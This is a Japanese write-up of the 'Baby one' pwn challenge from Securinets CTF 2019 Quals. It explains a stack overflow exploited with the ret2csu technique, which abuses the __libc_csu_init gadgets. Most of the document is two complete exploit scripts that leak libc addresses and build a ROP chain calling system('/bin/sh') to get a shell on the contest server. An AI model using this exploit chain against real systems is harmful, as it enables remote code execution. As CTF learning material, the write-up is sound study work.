# [pwn 975pts] Baby one - Securinets CTF 2019 Quals
64ビットバイナリです．
libcは配布されていません．
```
$ checksec baby1
[*] 'baby1'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
setbufした後に文字列をwriteし，0x12Cバイトreadします．
しかし，このとき使われるバッファは0x30バイトしか確保されていないため，スタックオーバーフロー脆弱性が存在します．
単にリターンアドレスを書き換えれば良さそうですが，leave, retの前に`xor rdx, rdx`があります．
したがって，ret2libcをしてもrdx，すなわち第3引数の値を変えることができません．

競技中はしばらくつまりましたが，さすがにまだ覚えているので解けます．
ここで使うのが`__libc_csu_init`です．
この関数は最後にrbx, rbp, r12, r13, r14, r15をpopしてくれます．
これだけだとrdxは変わらないのですが，同じ関数に次のような命令があります．
```nasm
loc_4006a0:
mov rdx, r13
mov rsi, r14
mov edi, r15d
call qword ptr [r12 + rbx * 8]
add rbx, 1
cmp rbx, rbp
jnz short loc_4006a0

add rsp, 8
pop rbx
pop rbp
...
```
このように，`r12 + rbx*8`に書かれたアドレスを引数とともにcallしてくれます．
rdxはr13からコピーされるので，先程のガジェットと組み合わせれば関数が呼べます．
今回は簡単のため，次のようにレジスタをセットしましょう．
```
rbx = 0
r12 = &addr_to_function
r15 = arg0
r14 = arg1
r13 = arg2
rbp = 1
```
こうすれば，一度callされた後にjnzを通過して最初に呼び出したガジェットと同じ位置へ戻ります．
関数のアドレスが書かれた場所としてはGOTを持っていますし，`_start`関数へのアドレスがELFにかかれているので，そこを参照すれば`main`が呼ばれ，何度でもオーバーフローを繰り返すことができます．

まずはlibcのバージョンを特定します．
```python
from ptrlib import *

elf = ELF("./baby1")
sock = Socket("51.254.114.246", 1111)
#sock = Socket("127.0.0.1", 4001)
#_ = input()

plt_write = 0x004004b0
plt_read = 0x004004c0
plt_setvbuf = 0x004004e0
plt_resolve = 0x004004a0
rop_pop_rdi = 0x004006c3
rop_pop_rsi_pop_r15 = 0x004006c1
rop_libc_csu_init = 0x004006ba
call_libc_csu_init = 0x004006a0

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("write")) # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("setvbuf"))  # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)

sock.recvline()
sock.send(payload)
addr1 = u64(sock.recv(8))
addr2 = u64(sock.recv(8))
dump("addr1 = " + hex(addr1))
dump("addr2 = " + hex(addr2))

sock.interactive()
```

libcのバージョンが特定できたら，`system('/bin/sh')`を呼び出してシェルを奪います．
```python
from ptrlib import *

elf = ELF("./baby1")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("51.254.114.246", 1111)
#libc = ELF("/lib64/libc.so.6")
#sock = Socket("127.0.0.1", 4001)
#_ = input()

plt_write = 0x004004b0
plt_read = 0x004004c0
plt_setvbuf = 0x004004e0
plt_resolve = 0x004004a0
rop_pop_rdi = 0x004006c3
rop_pop_rsi_pop_r15 = 0x004006c1
rop_libc_csu_init = 0x004006ba
call_libc_csu_init = 0x004006a0

""" Stage 1 """
payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("write")) # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(elf.got("write")) # r14 --> rsi
payload += p64(1)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(0)                # rbp --> loop max
payload += p64(0x400018)         # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)

sock.recvline()
sock.send(payload)
addr = u64(sock.recv(8))
libc_base = addr - libc.symbol("write")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

""" Stage 2 """
sock.recvline()

addr_store = elf.symbol("__bss_start") + 8

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(elf.got("read"))  # r12 --> call [r12]
payload += p64(8)                # r13 --> rdx
payload += p64(addr_store)       # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)
payload += b'A' * 8 # add rsp, 8
payload += p64(0)                # rbx
payload += p64(0)                # rbp --> loop max
payload += p64(0x400018)         # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(call_libc_csu_init)

payload = payload + b'X' * (0x12c - len(payload))

sock.send(payload)
sock.send(p64(addr_system))

dump("wrote <system> to " + hex(addr_store))

""" Stage 3 """
sock.recvline()

call_libc_csu_init_direct = 0x004006a9

payload = b'A' * 0x38

payload += p64(rop_libc_csu_init)
payload += p64(0)                # rbx
payload += p64(1)                # rbp --> loop max
payload += p64(addr_store)       # r12 --> call [r12]
payload += p64(0)                # r13 --> rdx
payload += p64(0)                # r14 --> rsi
payload += p64(0)                # r15 --> rdi

payload += p64(rop_pop_rdi)
payload += p64(addr_binsh)

payload += p64(call_libc_csu_init_direct)

sock.send(payload)

sock.interactive()
```

# 感想
この手法はret2csuとか呼ばれているらしいです．
競技中は知らなかったので勉強になりました．
